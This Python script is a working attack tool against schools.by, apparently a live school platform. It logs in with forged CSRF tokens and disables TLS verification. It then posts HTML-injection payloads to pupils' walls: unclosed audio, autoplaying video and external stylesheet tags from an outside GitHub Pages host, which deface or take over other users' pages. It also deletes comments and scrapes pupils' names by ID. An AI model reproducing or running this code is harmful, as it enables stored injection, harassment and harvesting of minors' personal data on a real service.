import random
import string

import requests
import urllib3
from bs4 import BeautifulSoup


def get_random_string(length):
	letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
	result_str = ''.join(random.choice(letters) for _ in range(length))
	return result_str


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
nonprintable = set(map(chr, list(range(0, 32)) + list(range(127, 160))))
ord_dict = {ord(character): None for character in nonprintable}


def filter_nonprintable(text):
	return text.translate(ord_dict)


def get_random(url):
	s = get_random_string(32)
	newsession = get_random_string(32)
	return {
		'Host': url.replace('https://', '').replace('http://', ''),
		'Connection': 'keep-alive',
		'Content-Length': '67',
		'Accept': 'application/json, text/javascript, */*; q=0.01',
		'DNT': '1',
		'X-CSRFToken': s,
		'X-Requested-With': 'XMLHttpRequest',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
					  'Chrome/89.0.4350.6 Safari/537.36',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Origin': url,
		'Sec-Fetch-Site': 'same-origin',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': url,
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US,en;q=0.9',
		'Cookie': 'csrftoken=' + s + '; sessionid=' + newsession + '; poll_bans="333333\0543233"; '
																   'slc_cookie=%7BslcMakeBetter%7D'}


def tryToLogin(login, password):
	url = "https://schools.by/login"
	csrf = get_random_string(32)
	headers = {
		'Host': 'schools.by',
		'Connection': 'keep-alive',
		'Content-Length': '67',
		'Accept': 'application/json, text/javascript, */*; q=0.01',
		'DNT': '1',
		'X-CSRFToken': csrf,
		'X-Requested-With': 'XMLHttpRequest',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
					  'Chrome/89.0.4350.6 Safari/537.36',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Origin': 'https://schools.by',
		'Sec-Fetch-Site': 'same-origin',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://schools.by/',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US,en;q=0.9',
		'Cookie': 'csrftoken=' + csrf}

	data = {
		'csrfmiddlewaretoken': csrf,
		'username': login,
		'password': password
	}

	result = requests.post(url, data, headers=headers, verify=False, allow_redirects=False)
	if result.status_code == 200:
		return None
	return [result.cookies['csrftoken'], result.cookies['sessionid'], result.headers['Location']]


class SchoolsAPI:
	def __init__(self, csrf, session, url):
		self.csrf = csrf
		self.session = session
		self.url = url

		self.data = {'text': '0', 'csrfmiddlewaretoken': csrf, 'model': 'Photo', 'item_id': '0'}

		self.headers = {'Host': url.replace('https://', '').replace('http://', ''),
				   'Connection': 'keep-alive',
				   'Accept': 'text/plain, */*; q=0.01',
				   'X-Requested-With': 'XMLHttpRequest',
				   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
								 'Chrome/87.0.4280.88 Safari/537.36',
				   'X-CSRFToken': csrf,
				   'Sec-Fetch-Site': 'same-origin',
				   'Sec-Fetch-Mode': 'cors',
				   'Sec-Fetch-Dest': 'empty',
				   'Referer': url,
				   'Accept-Encoding': 'gzip, deflate, br',
				   'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
				   'Cookie': 'csrftoken=' + csrf + '; sessionid=' + session + '; poll_bans="333333\0543233"; '
																			  'slc_cookie=%7BslcMakeBetter%7D'}

		self.headers_post = {
			'Host': url.replace('https://', '').replace('http://', ''),
			'Connection': 'keep-alive',
			'Content-Length': '220',
			'Accept': 'text/plain, */*; q=0.01',
			'X-CSRFToken': csrf,
			'X-Requested-With': 'XMLHttpRequest',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
						  'Chrome/87.0.4280.88 Safari/537.36',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Origin': url,
			'Sec-Fetch-Site': 'same-origin',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Dest': 'empty',
			'Referer': url,
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
			'Cookie': 'csrftoken=' + csrf + '; sessionid=' + session + '; poll_bans="333333\0543233"; '
																	   'slc_cookie=%7BslcMakeBetter%7D'
		}

	def sendTo(self, userid, message):
		data_on_wall = {'text': message, 'return': 'wall', 'model': 'Pupil', 'item_id': userid}
		requests.post(f"{self.url}/comments/save", data_on_wall, headers=self.headers_post, verify=False)

	def deletePost(self, userid):
		requests.get(f"{self.url}/comment/{userid}/delete", headers=self.headers, verify=False)

	def getFamilyByID(self, userid):
		body = requests.get(f"{self.url}/pupil/{userid}", headers=self.headers, verify=False)
		if body.status_code == 404:
			return ''
		soup = BeautifulSoup(body.text, 'html.parser')
		name = soup.find("div", class_="title_box").find("h1").text
		return filter_nonprintable(name)

	def sendRadio(self, userid):
		self.sendTo(userid,
					'чиво<audio src="//online-1.gkvr.ru:8000/record_sam_96.aac" controls <!--')

	def sendVideoAndBackground(self, userid):
		self.sendTo(userid,
			   '<video preload="auto" autoplay="autoplay" loop="true" controls="controls" '
			   'src="//cdn.filesend.jp/private/N4E_IbPNuGu58LeeUvBRPvBDMfxZmneF8Uavr-zI-lCBuej6YARDPYYgJSWfd90K'
			   '/videoplayback.mp4" <!--')
		self.sendTo(userid,
			   'имя царское конечно<link type="text/css" rel="stylesheet" href="//g1phy.github.io/antischools/test.css" <!--')

	def giveDesign(self, userid, url):
		self.sendTo(userid,
					f'Big love from Matteo <3<link type="text/css" rel="stylesheet" '
					f'href="//g1phy.github.io/antischools/{url}" <!--')

	def isValid(self):
		return requests.post(f"{self.url}/comments/save", {'check': 'auth'},
							 headers=self.headers_post, verify=False).headers.get('Set-Cookie', None) is None
